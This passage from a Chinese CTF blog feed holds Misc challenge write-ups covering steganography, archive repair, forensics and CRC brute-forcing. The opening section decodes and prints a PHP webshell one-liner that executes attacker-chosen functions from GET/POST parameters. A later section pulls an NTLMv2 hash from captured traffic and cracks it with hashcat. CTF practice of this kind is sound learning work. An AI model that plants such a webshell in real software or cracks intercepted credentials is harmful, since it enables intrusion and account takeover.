的利用</h2>\n<p>附件给了马，需要我们自行解密得到密码</p>\n<p>可以动调直接得到，也可以使用 python 脚本一次次解密</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\">import binascii</span><br><span class=\"line\">import codecs</span><br><span class=\"line\"></span><br><span class=\"line\">def convert_uudecode(encoded_string):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        decoded_bytes = binascii.a2b_uu(encoded_string)</span><br><span class=\"line\">        return decoded_bytes</span><br><span class=\"line\">    except Exception as e:</span><br><span class=\"line\">        return str(e)</span><br><span class=\"line\">str=&quot;密文&quot;</span><br><span class=\"line\">decoded_str = base64.b64decode(str)</span><br><span class=\"line\"></span><br><span class=\"line\">decoded_str = decoded_str.decode(&#x27;utf-8&#x27;)</span><br><span class=\"line\">decoded_str = codecs.encode(decoded_str, &#x27;rot_13&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">with open(&quot;output.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:</span><br><span class=\"line\">    f.write(decoded_str)</span><br><span class=\"line\">with open(&quot;output.txt&quot;, &quot;r&quot;) as file:</span><br><span class=\"line\">    for line in file:</span><br><span class=\"line\">        decoded_bytes = convert_uudecode(line)</span><br><span class=\"line\">        decoded_str = decoded_bytes.decode(&#x27;utf-8&#x27;)</span><br><span class=\"line\">        decoded_str = codecs.encode(decoded_str, &#x27;rot_13&#x27;)</span><br><span class=\"line\">        print(decoded_str,end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>\n<p>这里自己写了一个解密脚本，刚开始以为只有一层，于是就写了一次的，结果发现套了好几层，懒得进行循环了，发现不多就手动循环了一下最终得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);($_GET[&#x27;7d67973a&#x27;])($_POST[&#x27;9fa3&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>get 传参加上 post 传参，拼接命令执行读取根目录下的 flag<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/RJXF2szDDITSQWDp.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<h2 id=\"jvav\"><a class=\"markdownIt-Anchor\" href=\"#jvav\">#</a> Jvav</h2>\n<p>刚开始以为是什么新知识点，结果发现题目其实是个梗，要告诉我们的是 java 语言这个信息</p>\n<p>结合图片为只有一张 png 图片，想到了 java 盲水印</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar BlindWatermark.jar decode -c challenge.png 1.png</span><br></pre></td></tr></table></figure>\n<p>得到<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jsrA8y98AoCdMbGh.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>flag{*</strong>*3bb3c3a628a94c}**</p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK1/",
            "url": "https://nnnpc.github.io/2024/04/16/NewStarCTF2023%20MiscWEEK1/",
            "title": "NewStarCTF2023Misc week1",
            "date_published": "2024-04-16T05:58:19.008Z",
            "content_html": "<h1 id=\"week1\"><a class=\"markdownIt-Anchor\" href=\"#week1\">#</a> WEEK1</h1>\n<h2 id=\"cyberchefs-secret\"><a class=\"markdownIt-Anchor\" href=\"#cyberchefs-secret\">#</a> CyberChef’s Secret</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/SlADFSEVyAAjmd1A.png!thumbnail\" alt=\"\"></p>\n<p>cyberchef 一把梭得到 flag</p>\n<p><em><em>flag{Base_15_S0_Easy</em>^*^}</em>*</p>\n<h2 id=\"机密图片\"><a class=\"markdownIt-Anchor\" href=\"#机密图片\">#</a> 机密图片</h2>\n<p>得到一张二维码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5E0ukxYfJrjxhyQ3.png!thumbnail\" alt=\"\"></p>\n<p>扫描了一下没东西，发现是 lsb 隐写，zsteg 一把梭</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MSCVb1maxJpMciYX.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece}</strong></p>\n<h2 id=\"流量鲨鱼\"><a class=\"markdownIt-Anchor\" href=\"#流量鲨鱼\">#</a> 流量！鲨鱼！</h2>\n<p>分析流量包，导出 http 对象中发现了可疑文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fm8MJgsyGuRqYssW.png!thumbnail\" alt=\"\"></p>\n<p>保存下来得到一串 base64 编码，解码得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aMfWX3QeG9Y8ksle.png!thumbnail\" alt=\"\"></p>\n<p><strong>flag{Wri35h4rk_1s_u53ful_b72a609537e6}</strong></p>\n<h2 id=\"压缩包们\"><a class=\"markdownIt-Anchor\" href=\"#压缩包们\">#</a> 压缩包们</h2>\n<p>得到一个无后缀文件，拖入 winhex 查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7eopXjr01zh0fhFd.png!thumbnail\" alt=\"\"></p>\n<p>发现是一个缺失头的压缩包，手动修复</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ooZnTdBacElb4Uiw.png!thumbnail\" alt=\"\"></p>\n<p>保存后解压下一个 flag.zip，解码注释可以知道压缩包密码是 6 位数，但是这里显示压缩包损坏（并且显示未加密），证明没有修复完全，对照着加密正确的加密压缩包进行修补</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zSIKOKXfdXFVbVSG.png!thumbnail\" alt=\"\"></p>\n<p>得到修复好的压缩包</p>\n<p>使用 ARCHPR 进行爆破得到密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9QudM0ynKfBMOXsZ.png!thumbnail\" alt=\"\"></p>\n<p>解压得到 flag</p>\n<p><strong>flag{y0u_ar3_the_m4ter_of_z1111ppp_606a4adc}</strong></p>\n<h2 id=\"空白格\"><a class=\"markdownIt-Anchor\" href=\"#空白格\">#</a> 空白格</h2>\n<p>点开附件发现是空白的，用 sublime 打开</p>\n<p>选中之后发现有东西</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/0vrGzyTSd4q4pXXg.png!thumbnail\" alt=\"\"></p>\n<p>whitespace 加密</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly92aWk1YXJkLmdpdGh1Yi5pby93aGl0ZXNwYWNlLw==\">https://vii5ard.github.io/whitespace/</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/u69KZXXiR3uNmvd3.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>flag{w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04}</strong></p>\n<h2 id=\"隐秘的眼睛\"><a class=\"markdownIt-Anchor\" href=\"#隐秘的眼睛\">#</a> 隐秘的眼睛</h2>\n<p>看题目就知道是考 silenteye 了，直接使用默认密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/b9F1RVI5uAVxKGLI.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>flag{R0ck1ng_y0u_63b0dc13a591}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/Geek%20Challenge%202023%20Misc/",
            "url": "https://nnnpc.github.io/2024/04/16/Geek%20Challenge%202023%20Misc/",
            "title": "Geek Challenge 2023 Misc",
            "date_published": "2024-04-16T05:58:18.981Z",
            "content_html": "<h2 id=\"cheekin\"><a class=\"markdownIt-Anchor\" href=\"#cheekin\">#</a> cheekin</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pB7sJsyfNUVq0eaA.png!thumbnail\" alt=\"\"></p>\n<p>公众号发 flag 获得一张图片，zsteg 一把梭</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4SrUbjKRJ6l0KQGH.png!thumbnail\" alt=\"\"></p>\n<p><strong>syc{s4y_he110_t0_syclover}</strong></p>\n<h2 id=\"ez_smilemo\"><a class=\"markdownIt-Anchor\" href=\"#ez_smilemo\">#</a> ez_smilemo</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QRH1MirCciqct2eu.png!thumbnail\" alt=\"\"></p>\n<p>是一道游戏题，给了 data.win，winhex 打开搜索 f1@g，找到上面的 base64</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UlYPN0Xa1XRmug7f.png!thumbnail\" alt=\"\"></p>\n<p>解码得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mDQCy8Miil7bvAbD.png!thumbnail\" alt=\"\"></p>\n<p><em><em>SYC{sm1le_1s</em>@<em>n1ce_g@me}</em></em></p>\n<h2 id=\"death_n0te\"><a class=\"markdownIt-Anchor\" href=\"#death_n0te\">#</a> DEATH_N0TE</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/m65jBLieKzB9R4t2.png!thumbnail\" alt=\"\"></p>\n<p>根据提示，首先 zsteg 在下面这段 base64 中得到前半段 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cACbJ1e9ezZNHi00.png!thumbnail\" alt=\"\"></p>\n<p>SYC{D4@Th_N0t4_</p>\n<p>接着放大图片查看像素点</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/nXHwwmWqNs87D6u4.png!thumbnail\" alt=\"\"></p>\n<p>能模糊看到有一些白色像素点围成的字母，猜测为后半段的密文，利用脚本提取白色像素点并且写入新的画布上</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from PIL import Image, ImageDraw</span><br><span class=\"line\"></span><br><span class=\"line\">image = Image.open(&#x27;kamisama.png&#x27;)</span><br><span class=\"line\">width, height = image.size</span><br><span class=\"line\">threshold = 200</span><br><span class=\"line\">new_image = Image.new(&#x27;RGB&#x27;, (width, height), (255, 255, 255))</span><br><span class=\"line\">draw = ImageDraw.Draw(new_image)</span><br><span class=\"line\"></span><br><span class=\"line\">def bold_pixel(x, y):</span><br><span class=\"line\">    for i in range(x - 1, x + 2):</span><br><span class=\"line\">        for j in range(y - 1, y + 2):</span><br><span class=\"line\">            draw.point((i, j), fill=(0, 0, 0))</span><br><span class=\"line\"></span><br><span class=\"line\">for x in range(width):</span><br><span class=\"line\">    for y in range(height):</span><br><span class=\"line\">        pixel = image.getpixel((x, y))</span><br><span class=\"line\">        if all(value &gt; threshold for value in pixel):</span><br><span class=\"line\">            bold_pixel(x, y)</span><br><span class=\"line\"></span><br><span class=\"line\">new_image.save(&#x27;output_image.png&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">image.close()</span><br></pre></td></tr></table></figure>\n<p>得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/AoEaqUbk0jFtQll3.png!thumbnail\" alt=\"\"></p>\n<p>上网寻找白色像素点围成的字体，发现是死亡笔记中的一种字体，找到对照表进行对照解码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Jy1uUGx2Moo9QZOX.png!thumbnail\" alt=\"\"></p>\n<p>flag 最后一截有几个字母不是很明显，但是大致对照完能猜测到是出题人的名字，最后拼接得到 flag</p>\n<p><strong>SYC{D4@Th_N0t4_NAME_o2takuXX}</strong></p>\n<h2 id=\"下一站是哪儿呢\"><a class=\"markdownIt-Anchor\" href=\"#下一站是哪儿呢\">#</a> 下一站是哪儿呢</h2>\n<p><strong><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/nwO4A4xaKrfFYzZq.png!thumbnail\" alt=\"\" title=\"fig:\"></strong></p>\n<p><strong>SYC{CZ8579_Luzhou}</strong></p>\n<h2 id=\"qingwan心都要碎了\"><a class=\"markdownIt-Anchor\" href=\"#qingwan心都要碎了\">#</a> Qingwan 心都要碎了</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/i0hUXEJmRiXJkkWW.png!thumbnail\" alt=\"\"></p>\n<p><strong>SYC {重庆中国三峡博物馆}</strong></p>\n<h2 id=\"xqr\"><a class=\"markdownIt-Anchor\" href=\"#xqr\">#</a> xqr</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1PhdlA32MBBqnAdo.png!thumbnail\" alt=\"\"></p>\n<p>下载附件不出意外是个 qrcode，但是扫码得到的是 wrong<br>\nflag，winhex 查看文件结构能发现还有一张图片拼接在该图片当中，手撕出来</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EYttOY8kK2F9MT3h.png!thumbnail\" alt=\"\"></p>\n<p>修改图片尺寸和原图片一样大，使用 stegsolve 的 combiner 功能进行合并，将合并的图片导出后再次导入 stegsolve 进行 xor，扫码即可得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/FYl9qTsKVnoScjzs.png!thumbnail\" alt=\"\"></p>\n<p><strong>SYC{hOp3_u_h@ve_Fun}</strong></p>\n<h2 id=\"death_n1te\"><a class=\"markdownIt-Anchor\" href=\"#death_n1te\">#</a> <strong>DEATH_N1TE</strong></h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Pk84HKKKHCpPxrKW.png!thumbnail\" alt=\"\"></p>\n<p>附件中拿到一个 webp 和一个 mp3 文件，mp3 文件听到后面发现是 sstv，使用工具扫描之后得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lklHUMuLBnpOU3ry.png!thumbnail\" alt=\"\"></p>\n<p>前半段 flag，SYC {H4xr0t0r</p>\n<p>接着打开 webp 文件，发现是个动图，上网搜了一下资料，需要使用命令 webpmux 进行分离帧的操作，暂时只知道一帧帧分离的语句，于是就写了个脚本进行循环执行分离</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">for i in range(0,1000):</span><br><span class=\"line\">    os.system(f&#x27;webpmux -get frame &#123;i&#125; killer.webp -o frame&#123;i&#125;.png&#x27;)</span><br></pre></td></tr></table></figure>\n<p>分离出来 881 张图片，根据图片的大小和张数利用 montage 和 gaps 进行调试拼图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">montage \\*.png -tile 40x22 -geometry +0+0 flag.png</span><br><span class=\"line\">gaps --image=flag.png --generations=40 --population=120 --size=48</span><br></pre></td></tr></table></figure>\n<p>最终得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BbUCRX44jEYRyyE6.png!thumbnail\" alt=\"\"></p>\n<p>解码得到后半段 flag</p>\n<p><strong>SYC{H4xr0t0r_14_Ki114R}</strong></p>\n<h2 id=\"窃听风云\"><a class=\"markdownIt-Anchor\" href=\"#窃听风云\">#</a> <strong>窃听风云</strong></h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/HjCsftpPeqPC8UDd.png!thumbnail\" alt=\"\"></p>\n<p>拿到流量包追踪一下 tcp 流，结合题目可以知道</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Bk9XBs7Cd97DHNAH.png!thumbnail\" alt=\"\"></p>\n<p>这是内网通信的流量，并且使用了 NTLM 验证身份的方式，上网搜索了一下该验证方式的工作流程，大致为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.首先客户端在本地加密当前用户的密码成hash</span><br><span class=\"line\">2.客户端向服务端发送账号，这里进行了明文传输</span><br><span class=\"line\">3.服务端确认了NTLM认证方式，并随机生成了16位的字符串作为challenge发送给了客户端</span><br><span class=\"line\">4.客户端再用生成的hash加密该challenge发送回服务端作为response</span><br><span class=\"line\">5.服务端再把用户名，challenge和response发送给域控制器</span><br><span class=\"line\">6.域控制器用这个用户名在SAM密码管理库中找到这个用户的密码散列，并同样加密challenge</span><br><span class=\"line\">7.比较两个加密后的challenge，如果相同则认证成功</span><br></pre></td></tr></table></figure>\n<p>接下来回看这道题目，既然是截获了通讯流量那么也就是说客户端和服务端所进行的一些通信数据都直接被截获了，根据题目要求，要找到用户的密码。根据工作流程可以知道，hashcat 爆破用户密码所需要的一些字段信息都能被流量所捕获到<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pNucLoAZNeu76EEx.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>并且通过最后一个返回包中的对话信息可以知道密码字典为 rockyou，接下来寻找到需要的字段就可以开始进行爆破了，以下为需要寻找的字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mVGJwwn0vCW3Btiu.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mpmcyKvrKJNaO6NN.png!thumbnail\" alt=\"\"></p>\n<p>过滤 ntlmssp.ntlmserverchallenge 能找到 challenge 字段信息</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bDBpfIq4o1HmUWFv.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</span><br></pre></td></tr></table></figure>\n<p>将得到的字段值拼接利用 hashcat 进行爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./hashcat.exe -m 5600 1.txt rockyou.txt -o out.txt --force</span><br></pre></td></tr></table></figure>\n<p>在 out.txt 中得到爆破出的密码<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lURCG5lq2sLKO7uO.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><strong>SYC{iamjackspassword}</strong></p>\n<h2 id=\"extractme\"><a class=\"markdownIt-Anchor\" href=\"#extractme\">#</a> extractMe</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127201453182.png\" alt=\"\"></p>\n<p>一眼丁真为 4byte 的 CRC32 爆破</p>\n<p>先用 7-zip.exe 的参数输出压缩包信息，并用脚本批量提取压缩包中的 CRC32（脚本来自八神）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import subprocess, re</span><br><span class=\"line\"></span><br><span class=\"line\">def getCRC(path: str):</span><br><span class=\"line\">    tmp = subprocess.Popen(f&#x27;7z.exe l &#123;path&#125; -slt&#x27;, stdout=subprocess.PIPE).communicate()[0].decode(&#x27;gbk&#x27;).replace(&#x27;\\r\\n&#x27;, &#x27;\\n&#x27;)</span><br><span class=\"line\">    return [(i, j) for i, j in zip(re.findall(r&#x27;(?&lt;=Path = ).*&#x27;, tmp)[1:], re.findall(r&#x27;(?&lt;=CRC = ).*&#x27;, tmp))]</span><br><span class=\"line\"></span><br><span class=\"line\">print(getCRC(&#x27;extractMe.7z&#x27;))</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[(&#x27;flag0&#x27;, &#x27;8712DE1D&#x27;), (&#x27;flag1&#x27;, &#x27;06EACBD7&#x27;), (&#x27;flag2&#x27;, &#x27;20A8E291&#x27;), (&#x27;flag3&#x27;, &#x27;31EE3074&#x27;), (&#x27;flag4&#x27;, &#x27;77AACF7F&#x27;), (&#x27;flag5&#x27;, &#x27;35FB7C6C&#x27;), (&#x27;flag6&#x27;, &#x27;F978D5AA&#x27;), (&#x27;flag7&#x27;, &#x27;016F7A0B&#x27;)]</span><br></pre></td></tr></table></figure>\n<p>再利用 4byte 的脚本爆破就好</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import binascii</span><br><span class=\"line\">import string</span><br><span class=\"line\"></span><br><span class=\"line\">def crack_crc():</span><br><span class=\"line\">    print(&#x27;-------------Start Crack CRC-------------&#x27;)</span><br><span class=\"line\">    crc_list = [0x8712DE1D, 0x06EACBD7, 0x20A8E291, 0x31EE3074, 0x77AACF7F, 0x35FB7C6C, 0xF978D5AA, 0x016F7A0B]</span><br><span class=\"line\">    comment = &#x27;&#x27;</span><br><span class=\"line\">    chars = string.printable</span><br><span class=\"line\">    for crc_value in crc_list:</span><br><span class=\"line\">        for char1 in chars:</span><br><span class=\"line\">            for char2 in chars:</span><br><span class=\"line\">                for char3 in chars:</span><br><span class=\"line\">                    for char4 in chars:</span><br><span class=\"line\">                        res_char = char1 + char2 + char3 + char4</span><br><span class=\"line\">                        char_crc = binascii.crc32(res_char.encode())</span><br><span class=\"line\">                        calc_crc = char_crc &amp; 0xffffffff</span><br><span class=\"line\">                        if calc_crc == crc_value:</span><br><span class=\"line\">                            print(&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;.format(hex(crc_value),res_char))</span><br><span class=\"line\">                            comment += res_char</span><br><span class=\"line\">    print(&#x27;-----------CRC Crack Completed-----------&#x27;)</span><br><span class=\"line\">    print(&#x27;Result: &#123;&#125;&#x27;.format(comment))</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    crack_crc()</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-------------Start Crack CRC-------------</span><br><span class=\"line\">[+] 0x8712de1d: SYC&#123;</span><br><span class=\"line\">[+] 0x6eacbd7: _cR@</span><br><span class=\"line\">[+] 0x20a8e291: ck_1</span><br><span class=\"line\">[+] 0x31ee3074: s_Us</span><br><span class=\"line\">[+] 0x77aacf7f: eful</span><br><span class=\"line\">[+] 0x35fb7c6c: _som</span><br><span class=\"line\">[+] 0xf978d5aa: etim</span><br><span class=\"line\">[+] 0x16f7a0b: e$_&#125;</span><br><span class=\"line\">-----------CRC Crack Completed-----------</span><br><span class=\"line\">Result: SYC&#123;_cR@ck_1s_Useful_sometime$_&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>SYC{<em>cR@ck_1s_Useful_sometime$</em>}</strong></p>\n<h2 id=\"时代的眼泪\"><a class=\"markdownIt-Anchor\" href=\"#时代的眼泪\">#</a> 时代的眼泪</h2>\n<p>取证大师一把梭</p>\n<p>找到最近打开的图片</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127203915620.png\" alt=\"\"></p>\n<p>根据路径寻找到图片并打开，获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231127204049939.png\" alt=\"\"></p>\n<p><strong>SYC{You_defeated_me_after_22_years}</strong></p>\n<h2 id=\"death_n2te\"><a class=\"markdownIt-Anchor\" href=\"#death_n2te\">#</a> DEATH_N2TE</h2>\n<p>附件就是一个 mp4 文件，视频播放器打开能明显看到有像素点变化，并且每一帧都不一样，随着视频的播放有一个白色像素点的滚动效果</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231129131244854.png\" alt=\"image-20231129131244854\"></p>\n<p>如图所示，那么对应着视频的帧宽和帧高，利用脚本去提取它每一帧的像素数据去进行重新组合到新的画布当中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import cv2</span><br><span class=\"line\">import numpy as np</span><br><span class=\"line\"></span><br><span class=\"line\">video = cv2.VideoCapture(&#x27;kira.mp4&#x27;)</span><br><span class=\"line\">fps = int(video.get(cv2.CAP_PROP_FPS))</span><br><span class=\"line\">frame_count = int(video.get(cv2.CAP_PROP_FRAME_COUNT))</span><br><span class=\"line\">video_width = 